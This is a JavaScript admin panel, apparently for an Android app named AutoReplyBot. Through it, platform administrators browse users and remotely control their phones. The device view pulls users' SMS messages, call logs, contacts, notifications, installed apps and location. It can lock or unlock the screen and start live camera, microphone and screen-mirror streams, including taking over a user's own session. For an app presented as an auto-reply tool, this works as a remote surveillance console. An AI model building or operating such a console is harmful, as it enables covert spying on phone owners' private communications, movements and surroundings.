import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-app.js";
import {
  getAuth,
  GoogleAuthProvider,
  onAuthStateChanged,
  signInWithPopup,
  signInWithEmailAndPassword,
  signOut,
} from "https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js";
import { startAdminLiveViewer } from "./live.js?v=3";

const viewLogin = document.getElementById("view-login");
const viewDenied = document.getElementById("view-denied");
const viewApp = document.getElementById("view-app");
const viewUser = document.getElementById("view-user");
const viewDevice = document.getElementById("view-device");
const authStatus = document.getElementById("auth-status");
const adminUser = document.getElementById("admin-user");
const deniedEmail = document.getElementById("denied-email");

/** @type {string} */
let idToken = "";
/** @type {import("https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js").Auth | null} */
let auth = null;
/** @type {object | null} */
let firebaseConfig = null;
/** @type {string} */
let activeTab = "dashboard";
/** @type {object[]} */
let cachedUsers = [];
/** @type {{ stop: () => Promise<void> } | null} */
let liveViewer = null;
/** @type {{ ownerUid: string, deviceId: string, data: object } | null} */
let exploreCtx = null;
/** @type {string} */
let currentUserUid = "";
/** @type {ReturnType<typeof setTimeout> | null} */
let liveOfferTimer = null;

function show(el, on) {
  if (!el) return;
  el.hidden = !on;
}

function showShell(which) {
  show(viewLogin, which === "login");
  show(viewDenied, which === "denied");
  show(viewApp, which === "app");
  show(viewUser, which === "user");
  show(viewDevice, which === "device");
}

function fmtTime(ms) {
  const n = Number(ms || 0);
  if (!n) return "—";
  try {
    return new Date(n).toLocaleString();
  } catch {
    return "—";
  }
}

function yesNo(v) {
  return v ? "Yes" : "No";
}

class ApiError extends Error {
  constructor(message, code, howTo, extra) {
    super(message);
    this.code = code || "";
    this.howTo = howTo || "";
    this.extra = extra || null;
  }
}

async function api(path, options = {}) {
  if (!idToken) throw new Error("Not signed in");
  const res = await fetch(path, {
    ...options,
    headers: {
      Authorization: `Bearer ${idToken}`,
      ...(options.body ? { "Content-Type": "application/json" } : {}),
      ...(options.headers || {}),
    },
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new ApiError(
      data.error || data.message || `HTTP ${res.status}`,
      data.code || "",
      data.howTo || "",
      data
    );
  }
  return data;
}

function formatApiError(e) {
  if (e instanceof ApiError) {
    return e.howTo ? `${e.message}\n\nHow: ${e.howTo}` : e.message;
  }
  return e instanceof Error ? e.message : String(e);
}

function escapeHtml(s) {
  return String(s || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function setTab(tab) {
  activeTab = tab;
  document.querySelectorAll(".admin-tab").forEach((btn) => {
    btn.classList.toggle("active", btn.getAttribute("data-tab") === tab);
  });
  document.querySelectorAll(".admin-panel").forEach((panel) => {
    panel.hidden = panel.id !== `tab-${tab}`;
  });
  if (tab === "dashboard") void loadDashboard();
  if (tab === "users") void loadUsers();
  if (tab === "admins") void loadAdmins();
}

async function loadDashboard() {
  const status = document.getElementById("dashboard-status");
  try {
    if (status) status.textContent = "Loading…";
    const data = await api("/api/admin/stats");
    document.getElementById("kpi-users").textContent = String(data.users ?? 0);
    document.getElementById("kpi-devices").textContent = String(data.devices ?? 0);
    document.getElementById("kpi-online").textContent = String(data.online ?? 0);
    document.getElementById("kpi-blocked").textContent = String(data.blocked ?? 0);
    if (status) status.textContent = "Updated just now.";
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

function renderUsers(users) {
  const tbody = document.getElementById("users-tbody");
  const cards = document.getElementById("users-cards");
  if (tbody) {
    if (!users.length) {
      tbody.innerHTML = `<tr><td colspan="6" class="muted">No users yet. Click Sync users.</td></tr>`;
    } else {
      tbody.innerHTML = users
        .map((u) => {
          const badge = u.blocked
            ? `<span class="admin-badge danger">Blocked</span>`
            : `<span class="admin-badge ok">Active</span>`;
          return `<tr>
            <td><div>${escapeHtml(u.email || u.uid)}</div>
              <div class="muted" style="font-size:0.8rem;">${escapeHtml(u.displayName || "")}</div></td>
            <td>${Number(u.deviceCount || 0)}</td>
            <td>${Number(u.onlineDeviceCount || 0)}</td>
            <td>${fmtTime(u.lastSeenAt)}</td>
            <td>${badge}</td>
            <td><button type="button" class="btn-secondary btn-user-open" data-uid="${escapeHtml(u.uid)}">Open</button></td>
          </tr>`;
        })
        .join("");
    }
  }
  if (cards) {
    cards.hidden = false;
    if (!users.length) {
      cards.innerHTML = `<p class="muted">No users yet. Click Sync users.</p>`;
    } else {
      cards.innerHTML = users
        .map((u) => {
          const badge = u.blocked
            ? `<span class="admin-badge danger">Blocked</span>`
            : `<span class="admin-badge ok">Active</span>`;
          return `<article class="admin-user-card">
            <div style="display:flex;justify-content:space-between;gap:8px;align-items:flex-start;">
              <strong>${escapeHtml(u.email || u.uid)}</strong>${badge}
            </div>
            <div class="row"><span class="muted">Devices</span><span>${Number(u.deviceCount || 0)} (${Number(u.onlineDeviceCount || 0)} online)</span></div>
            <div class="row"><span class="muted">Last seen</span><span>${fmtTime(u.lastSeenAt)}</span></div>
            <button type="button" class="btn-primary btn-user-open" style="margin-top:10px;width:100%;" data-uid="${escapeHtml(u.uid)}">Open user</button>
          </article>`;
        })
        .join("");
    }
  }
  document.querySelectorAll(".btn-user-open").forEach((btn) => {
    btn.addEventListener("click", () => openUser(btn.getAttribute("data-uid")));
  });
}

async function loadUsers() {
  const status = document.getElementById("users-status-text");
  const q = document.getElementById("users-search")?.value || "";
  const st = document.getElementById("users-status")?.value || "all";
  try {
    if (status) status.textContent = "Loading…";
    const params = new URLSearchParams();
    if (q) params.set("q", q);
    if (st) params.set("status", st);
    const data = await api(`/api/admin/users?${params.toString()}`);
    cachedUsers = data.users || [];
    renderUsers(cachedUsers);
    if (status) status.textContent = `${cachedUsers.length} user(s)`;
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

async function loadAdmins() {
  const list = document.getElementById("admins-list");
  const status = document.getElementById("admins-status");
  try {
    if (status) status.textContent = "Loading…";
    const data = await api("/api/admin/admins");
    const emails = data.emails || [];
    if (!list) return;
    list.innerHTML = emails
      .map(
        (email) => `<li>
          <span>${escapeHtml(email)}</span>
          <button type="button" class="btn-danger-soft btn-admin-remove" data-email="${escapeHtml(email)}">Remove</button>
        </li>`
      )
      .join("");
    list.querySelectorAll(".btn-admin-remove").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const email = btn.getAttribute("data-email");
        if (!email || !confirm(`Remove admin ${email}?`)) return;
        try {
          await api("/api/admin/admins", { method: "DELETE", body: JSON.stringify({ email }) });
          await loadAdmins();
        } catch (e) {
          alert(formatApiError(e));
        }
      });
    });
    if (status) status.textContent = `${emails.length} admin(s)`;
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

function kvCard(title, rows) {
  const body = rows
    .filter((r) => r[1] !== undefined && r[1] !== null && r[1] !== "")
    .map(
      ([k, v]) =>
        `<dt>${escapeHtml(k)}</dt><dd>${escapeHtml(String(v))}</dd>`
    )
    .join("");
  return `<article class="admin-info-card"><h3>${escapeHtml(title)}</h3><dl class="admin-kv">${body || "<dd class='muted'>No data</dd>"}</dl></article>`;
}

function pick(obj, path) {
  if (!obj) return "";
  const parts = path.split(".");
  let cur = obj;
  for (const p of parts) {
    if (cur == null) return "";
    cur = cur[p];
  }
  return cur == null ? "" : cur;
}

async function openUser(uid) {
  if (!uid) return;
  currentUserUid = uid;
  showShell("user");
  const title = document.getElementById("user-page-title");
  const sub = document.getElementById("user-page-sub");
  const actions = document.getElementById("user-page-actions");
  const body = document.getElementById("user-page-body");
  if (body) body.textContent = "Loading…";
  try {
    const data = await api(`/api/admin/users/${encodeURIComponent(uid)}`);
    const u = data.user || {};
    if (title) title.textContent = u.email || u.uid;
    if (sub) {
      sub.textContent = `${u.blocked ? "Blocked" : "Active"} · ${u.deviceCount || 0} device(s) · last seen ${fmtTime(u.lastSeenAt)}`;
    }
    if (actions) {
      actions.innerHTML = u.blocked
        ? `<button type="button" class="btn-primary" id="btn-unblock">Unblock</button>`
        : `<button type="button" class="btn-danger" id="btn-block">Block user</button>`;
      document.getElementById("btn-block")?.addEventListener("click", async () => {
        const reason = prompt("Block reason (shown to the user):", "Blocked by administrator");
        if (reason == null) return;
        await api(`/api/admin/users/${encodeURIComponent(uid)}/block`, {
          method: "POST",
          body: JSON.stringify({ reason }),
        });
        await openUser(uid);
        await loadUsers();
      });
      document.getElementById("btn-unblock")?.addEventListener("click", async () => {
        if (!confirm("Unblock this user?")) return;
        await api(`/api/admin/users/${encodeURIComponent(uid)}/unblock`, {
          method: "POST",
          body: JSON.stringify({}),
        });
        await openUser(uid);
        await loadUsers();
      });
    }

    const devices = data.devices || [];
    const clients = data.trustedClients || [];
    if (body) {
      body.innerHTML = `
        <div class="admin-info-card">
          <h3>Devices</h3>
          <p class="muted">Open a device for full-page control (camera, sync, lock, etc.).</p>
          <div class="admin-card-grid" style="margin-top:10px;">
            ${
              devices.length
                ? devices
                    .map(
                      (d) => `<article class="admin-item-card">
                        <strong>${escapeHtml(d.deviceName || d.deviceId)}</strong>
                        <span class="muted">${escapeHtml(d.deviceModel || "")} · ${d.online ? "online" : "offline"} · app ${escapeHtml(d.appVersion || "?")}</span>
                        <button type="button" class="btn-primary btn-explore-device" style="margin-top:10px;width:100%;"
                          data-uid="${escapeHtml(uid)}" data-device="${escapeHtml(d.deviceId)}" ${d.revoked ? "disabled" : ""}>
                          Explore &amp; control
                        </button>
                      </article>`
                    )
                    .join("")
                : `<p class="muted">No devices registered.</p>`
            }
          </div>
        </div>
        <div class="admin-info-card">
          <h3>Trusted browsers</h3>
          <div class="admin-card-grid">
            ${
              clients.length
                ? clients
                    .map(
                      (c) => `<article class="admin-item-card">
                        <strong>${escapeHtml(c.label || c.clientId)}</strong>
                        <span class="muted">${escapeHtml(c.browserName || "")} / ${escapeHtml(c.operatingSystem || "")}
                        ${c.revoked ? " · revoked" : ""}
                        ${c.clientId === "platform_admin" ? " · admin" : ""}</span>
                      </article>`
                    )
                    .join("")
                : `<p class="muted">No trusted browsers.</p>`
            }
          </div>
        </div>
      `;
      body.querySelectorAll(".btn-explore-device").forEach((btn) => {
        btn.addEventListener("click", () => {
          void openDeviceExplore(btn.getAttribute("data-uid"), btn.getAttribute("data-device"));
        });
      });
    }
  } catch (e) {
    if (body) body.textContent = formatApiError(e);
  }
}

async function stopLiveViewer() {
  if (liveOfferTimer) {
    clearTimeout(liveOfferTimer);
    liveOfferTimer = null;
  }
  if (liveViewer) {
    try {
      await liveViewer.stop();
    } catch {
      /* ignore */
    }
    liveViewer = null;
  }
}

async function openDeviceExplore(ownerUid, deviceId) {
  if (!ownerUid || !deviceId) return;
  await stopLiveViewer();
  showShell("device");
  const title = document.getElementById("device-page-title");
  const sub = document.getElementById("device-page-sub");
  const body = document.getElementById("device-page-body");
  if (body) body.textContent = "Loading device…";
  try {
    const data = await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}`
    );
    exploreCtx = { ownerUid, deviceId, data };
    const d = data.device || {};
    if (title) title.textContent = d.deviceName || d.deviceModel || deviceId;
    if (sub) {
      sub.textContent = `${d.manufacturer || ""} ${d.deviceModel || ""} · ${d.online ? "Online" : "Offline"} · battery ${d.batteryLevel ?? "—"}%`;
    }
    renderDeviceExplore("overview");
  } catch (e) {
    if (body) body.textContent = formatApiError(e);
  }
}

function renderDeviceExplore(tab) {
  const body = document.getElementById("device-page-body");
  if (!body || !exploreCtx) return;
  const { ownerUid, deviceId, data } = exploreCtx;
  const d = data.device || {};
  const info = data.deviceInfo || {};
  const basic = info.basic || info;
  const loc = data.location || {};

  const tabs = [
    ["overview", "Overview"],
    ["live", "Live"],
    ["controls", "Controls"],
    ["messages", "Messages"],
    ["calls", "Call logs"],
    ["contacts", "Contacts"],
    ["notifications", "Notifications"],
    ["apps", "Apps"],
    ["limits", "What’s possible"],
  ];
  const tabBar = tabs
    .map(
      ([id, label]) =>
        `<button type="button" data-dtab="${id}" class="${id === tab ? "active" : ""}">${label}</button>`
    )
    .join("");

  let panel = "";
  if (tab === "overview") {
    panel = `
      <div class="admin-cmd-row">
        <button type="button" class="btn-secondary" id="btn-dev-refresh">Refresh</button>
        <button type="button" class="btn-secondary" id="btn-dev-sync-info">Sync device info</button>
        <button type="button" class="btn-secondary" id="btn-dev-sync-loc">Request location</button>
      </div>
      <p id="device-action-status" class="muted" aria-live="polite"></p>
      <div class="admin-card-grid">
        ${kvCard("Device status", [
          ["Name", d.deviceName || d.deviceModel],
          ["Model", d.deviceModel],
          ["Manufacturer", d.manufacturer],
          ["Android", d.androidVersion],
          ["App version", d.appVersion],
          ["Online", yesNo(d.online)],
          ["Battery", d.batteryLevel != null ? `${d.batteryLevel}%` : "—"],
          ["Remote control", yesNo(d.remoteControlEnabled)],
          ["Camera ready", yesNo(d.cameraAvailable)],
          ["Microphone ready", yesNo(d.microphoneAvailable)],
          ["Last seen", fmtTime(d.lastSeenAt)],
          ["Device ID", d.deviceId || deviceId],
        ])}
        ${kvCard("Phone details", [
          ["Brand", pick(basic, "brand") || d.manufacturer],
          ["Product", pick(basic, "product")],
          ["Build", pick(basic, "buildVersion")],
          ["SDK", pick(basic, "sdkVersion")],
          ["Security patch", pick(basic, "securityPatch")],
          ["Time zone", pick(basic, "timeZone")],
          ["Note", !info || (!info.basic && !Object.keys(info).length) ? "No cached info yet — tap Sync device info" : ""],
        ])}
        ${kvCard("Location (cached)", [
          ["Latitude", pick(loc, "latitude") || pick(loc, "lat")],
          ["Longitude", pick(loc, "longitude") || pick(loc, "lng") || pick(loc, "lon")],
          ["Accuracy", pick(loc, "accuracy")],
          ["Updated", fmtTime(pick(loc, "updatedAt") || pick(loc, "timestamp") || pick(loc, "at"))],
          ["Note", !loc || !Object.keys(loc).length ? "No cached location — tap Request location" : ""],
        ])}
        ${kvCard("Active live sessions", [
          ["Count", String((data.activeSessions || []).length)],
          [
            "Details",
            (data.activeSessions || [])
              .map((s) => `${s.sessionKind || "session"} · ${s.status} · ${s.clientId === "platform_admin" ? "admin" : "user"}`)
              .join(" | ") || "None",
          ],
        ])}
      </div>
    `;
  } else if (tab === "live") {
    panel = `
      <div class="admin-info-card">
        <h3>Live camera / screen</h3>
        <p class="muted">Starts via Platform Admin. If the phone is locked, tap the AutoReplyBot notification. Screen mirror still needs Android’s system consent.</p>
        <div class="admin-cmd-row">
          <button type="button" class="btn-primary" id="btn-live-cam">Start camera + mic</button>
          <button type="button" class="btn-secondary" id="btn-live-screen">Start screen mirror</button>
          <button type="button" class="btn-danger-soft" id="btn-live-stop">Stop live</button>
        </div>
        <p id="live-status" class="muted" aria-live="polite"></p>
        <video id="admin-live-video" class="admin-live-video" autoplay playsinline muted></video>
      </div>
    `;
  } else if (tab === "controls") {
    panel = `
      <div class="admin-info-card">
        <h3>Commands</h3>
        <p class="muted">Does not revoke user browsers. May wake the phone app briefly.</p>
        <div class="admin-cmd-row">
          <button type="button" class="btn-secondary" data-action="DEVICE_INFO_REFRESH">Sync info</button>
          <button type="button" class="btn-secondary" data-action="LOCATION_GET_CURRENT">Location now</button>
          <button type="button" class="btn-secondary" data-action="MESSAGES_SYNC">Sync messages</button>
          <button type="button" class="btn-secondary" data-action="CALL_LOGS_SYNC">Sync call logs</button>
          <button type="button" class="btn-secondary" data-action="CONTACTS_SYNC">Sync contacts</button>
          <button type="button" class="btn-secondary" data-action="NOTIFICATIONS_SYNC">Sync notifications</button>
          <button type="button" class="btn-secondary" data-action="APPS_INDEX">Sync apps</button>
          <button type="button" class="btn-secondary" data-action="SCREEN_LOCK">Lock screen</button>
          <button type="button" class="btn-secondary" data-action="SCREEN_UNLOCK">Unlock / wake</button>
        </div>
        <p id="device-action-status" class="muted" aria-live="polite"></p>
      </div>
    `;
  } else if (tab === "messages") {
    panel = listCards("Messages", data.messages, ["address", "body", "date", "type"], "Sync messages from Controls if empty.");
  } else if (tab === "calls") {
    panel = listCards("Call logs", data.callLogs, ["number", "duration", "type", "date"], "Sync call logs from Controls if empty.");
  } else if (tab === "contacts") {
    panel = listCards("Contacts", data.contacts, ["displayName", "name", "phone", "number"], "Sync contacts from Controls if empty.");
  } else if (tab === "notifications") {
    panel = listCards("Notifications", data.notifications, ["packageName", "title", "text", "postedAt"], "Sync notifications from Controls if empty.");
  } else if (tab === "apps") {
    panel = listCards("Installed apps", data.apps, ["label", "packageName", "versionName"], "Sync apps from Controls if empty.");
  } else if (tab === "limits") {
    panel = `<div class="admin-info-card"><h3>What’s possible</h3>${(data.limitations || [])
      .map(
        (l) => `<div class="admin-limit-card">
          <strong>${escapeHtml(l.feature)} — ${l.possible ? "Possible" : "Needs setup"}</strong>
          <span class="muted">${escapeHtml(l.note)}</span>
        </div>`
      )
      .join("")}</div>`;
  }

  body.innerHTML = `<div class="admin-device-tabs">${tabBar}</div><div>${panel}</div>`;
  body.querySelectorAll("[data-dtab]").forEach((btn) => {
    btn.addEventListener("click", () => renderDeviceExplore(btn.getAttribute("data-dtab") || "overview"));
  });

  document.getElementById("btn-dev-refresh")?.addEventListener("click", () => {
    void openDeviceExplore(ownerUid, deviceId);
  });
  document.getElementById("btn-dev-sync-info")?.addEventListener("click", () => {
    void runDeviceCommand(ownerUid, deviceId, "DEVICE_INFO_REFRESH");
  });
  document.getElementById("btn-dev-sync-loc")?.addEventListener("click", () => {
    void runDeviceCommand(ownerUid, deviceId, "LOCATION_GET_CURRENT");
  });
  body.querySelectorAll("[data-action]").forEach((btn) => {
    btn.addEventListener("click", () => {
      void runDeviceCommand(ownerUid, deviceId, btn.getAttribute("data-action"));
    });
  });
  document.getElementById("btn-live-cam")?.addEventListener("click", () => {
    void startLive(ownerUid, deviceId, ["camera", "microphone"], false);
  });
  document.getElementById("btn-live-screen")?.addEventListener("click", () => {
    void startLive(ownerUid, deviceId, ["screenMirror"], false);
  });
  document.getElementById("btn-live-stop")?.addEventListener("click", async () => {
    await stopLiveViewer();
    const st = document.getElementById("live-status");
    if (st) st.textContent = "Live viewer stopped.";
  });
}

function listCards(title, items, fields, emptyHint) {
  const arr = Array.isArray(items) ? items : [];
  if (!arr.length) {
    return `<div class="admin-info-card"><h3>${escapeHtml(title)}</h3><p class="muted">${escapeHtml(emptyHint)}</p></div>`;
  }
  const cards = arr
    .slice(0, 40)
    .map((item) => {
      const rows = fields
        .map((f) => {
          const v = item[f] ?? item[f.replace(/At$/, "")] ?? "";
          if (v === "" || v == null) return "";
          const label = f.replace(/([A-Z])/g, " $1").replace(/^./, (c) => c.toUpperCase());
          const display =
            typeof v === "number" && String(f).toLowerCase().includes("date")
              ? fmtTime(v)
              : typeof v === "number" && v > 1e12
                ? fmtTime(v)
                : String(v);
          return `<div class="row"><span class="muted">${escapeHtml(label)}</span><span>${escapeHtml(display).slice(0, 180)}</span></div>`;
        })
        .filter(Boolean)
        .join("");
      const head = item.label || item.displayName || item.title || item.packageName || item.number || item.address || item.id || "Item";
      return `<article class="admin-item-card"><strong>${escapeHtml(String(head))}</strong>${rows}</article>`;
    })
    .join("");
  return `<div class="admin-info-card"><h3>${escapeHtml(title)} (${arr.length})</h3><div class="admin-card-grid" style="margin-top:10px;">${cards}</div></div>`;
}

async function runDeviceCommand(ownerUid, deviceId, action) {
  const status = document.getElementById("device-action-status");
  try {
    if (status) status.textContent = `Sending ${action}…`;
    await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/command`,
      { method: "POST", body: JSON.stringify({ action, payload: {} }) }
    );
    if (status) status.textContent = `${action} sent. Tap Refresh in a few seconds.`;
  } catch (e) {
    if (status) status.textContent = formatApiError(e);
    else alert(formatApiError(e));
  }
}

async function startLive(ownerUid, deviceId, capabilities, forceReplace) {
  const status = document.getElementById("live-status");
  const video = document.getElementById("admin-live-video");
  try {
    await stopLiveViewer();
    if (status) status.textContent = "Starting live session…";
    let result;
    try {
      result = await api(
        `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
        {
          method: "POST",
          body: JSON.stringify({ capabilities, forceReplace: Boolean(forceReplace) }),
        }
      );
    } catch (e) {
      if (e instanceof ApiError && e.code === "USER_SESSION_ACTIVE") {
        const ok = confirm(
          `${e.message}\n\n${e.howTo || ""}\n\nTake over now? (Ends their same-type live session only.)`
        );
        if (!ok) {
          if (status) status.textContent = "Cancelled — user session left running.";
          return;
        }
        result = await api(
          `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
          {
            method: "POST",
            body: JSON.stringify({ capabilities, forceReplace: true }),
          }
        );
      } else {
        throw e;
      }
    }
    if (!firebaseConfig) throw new Error("Firebase config missing");
    if (!video) throw new Error("Video element missing");
    if (status) {
      status.textContent = result.notes || "Connecting… Waiting for phone offer.";
    }
    liveOfferTimer = setTimeout(() => {
      const st = document.getElementById("live-status");
      if (st && /Listening for phone offer|Waiting for phone/i.test(st.textContent || "")) {
        st.textContent =
          "Still waiting for the phone. Unlock the phone and open AutoReplyBot (or tap its notification), then try Start again.";
      }
    }, 20000);

    liveViewer = await startAdminLiveViewer({
      firebaseConfig,
      customToken: result.customToken,
      ownerUid: result.ownerUid,
      sessionId: result.sessionId,
      iceServers: Array.isArray(result.iceServers)
        ? result.iceServers
        : result.iceServers?.iceServers || [],
      videoEl: video,
      onStatus: (m) => {
        if (status) status.textContent = m;
        if (/Receiving media|Answer sent/i.test(m) && liveOfferTimer) {
          clearTimeout(liveOfferTimer);
          liveOfferTimer = null;
        }
      },
    });
  } catch (e) {
    if (status) status.textContent = formatApiError(e);
    else alert(formatApiError(e));
  }
}

async function enterAdmin(user) {
  idToken = await user.getIdToken(true);
  const me = await api("/api/admin/me");
  if (!me.isAdmin) {
    showShell("denied");
    if (deniedEmail) deniedEmail.textContent = `Signed in as ${user.email || user.uid}`;
    return;
  }
  showShell("app");
  if (adminUser) adminUser.textContent = me.email || user.email || "";
  setTab(activeTab || "dashboard");
}

function setLoggedOut() {
  idToken = "";
  void stopLiveViewer();
  showShell("login");
}

function registerAdminPwa() {
  if (!("serviceWorker" in navigator)) return;
  navigator.serviceWorker
    .register("/device/admin/sw.js", { scope: "/device/admin/" })
    .catch(() => {});
}

async function main() {
  registerAdminPwa();
  const cfgRes = await fetch("/api/config");
  if (!cfgRes.ok) throw new Error("Failed to load /api/config");
  const cfg = await cfgRes.json();
  firebaseConfig = cfg.firebase;
  const app = initializeApp(cfg.firebase);
  auth = getAuth(app);

  document.querySelectorAll(".admin-tab").forEach((btn) => {
    btn.addEventListener("click", () => setTab(btn.getAttribute("data-tab") || "dashboard"));
  });
  document.getElementById("btn-users-refresh")?.addEventListener("click", () => loadUsers());
  document.getElementById("users-search")?.addEventListener("keydown", (ev) => {
    if (ev.key === "Enter") void loadUsers();
  });
  document.getElementById("users-status")?.addEventListener("change", () => loadUsers());
  document.getElementById("btn-user-back")?.addEventListener("click", () => {
    showShell("app");
    setTab("users");
  });
  document.getElementById("btn-device-back")?.addEventListener("click", async () => {
    await stopLiveViewer();
    if (currentUserUid) await openUser(currentUserUid);
    else {
      showShell("app");
      setTab("users");
    }
  });

  document.getElementById("btn-admin-add")?.addEventListener("click", async () => {
    const input = document.getElementById("admin-email-input");
    const email = String(input?.value || "").trim();
    if (!email) return;
    try {
      await api("/api/admin/admins", { method: "POST", body: JSON.stringify({ email }) });
      if (input) input.value = "";
      await loadAdmins();
    } catch (e) {
      alert(formatApiError(e));
    }
  });

  document.getElementById("btn-sync")?.addEventListener("click", async () => {
    const status = document.getElementById("dashboard-status");
    try {
      if (status) status.textContent = "Syncing from Firebase Auth…";
      const data = await api("/api/admin/sync-users", { method: "POST", body: "{}" });
      if (status) status.textContent = `Synced ${data.synced || 0} user(s).`;
      await loadDashboard();
      if (activeTab === "users") await loadUsers();
    } catch (e) {
      alert(formatApiError(e));
    }
  });

  document.getElementById("btn-logout")?.addEventListener("click", () => signOut(auth));
  document.getElementById("btn-denied-logout")?.addEventListener("click", () => signOut(auth));

  document.getElementById("btn-login-email")?.addEventListener("click", async () => {
    const email = document.getElementById("auth-email")?.value?.trim();
    const password = document.getElementById("auth-password")?.value || "";
    if (!email || !password) {
      if (authStatus) authStatus.textContent = "Enter email and password.";
      return;
    }
    try {
      if (authStatus) authStatus.textContent = "Signing in…";
      await signInWithEmailAndPassword(auth, email, password);
    } catch (e) {
      if (authStatus) authStatus.textContent = e instanceof Error ? e.message : String(e);
    }
  });

  document.getElementById("btn-login-google")?.addEventListener("click", async () => {
    try {
      if (authStatus) authStatus.textContent = "Opening Google…";
      await signInWithPopup(auth, new GoogleAuthProvider());
    } catch (e) {
      if (authStatus) authStatus.textContent = e instanceof Error ? e.message : String(e);
    }
  });

  onAuthStateChanged(auth, async (user) => {
    if (!user) {
      setLoggedOut();
      return;
    }
    try {
      if (authStatus) authStatus.textContent = "Checking admin access…";
      await enterAdmin(user);
    } catch (e) {
      if (authStatus) authStatus.textContent = e instanceof Error ? e.message : String(e);
      setLoggedOut();
    }
  });
}

main().catch((e) => {
  if (authStatus) authStatus.textContent = e instanceof Error ? e.message : String(e);
});
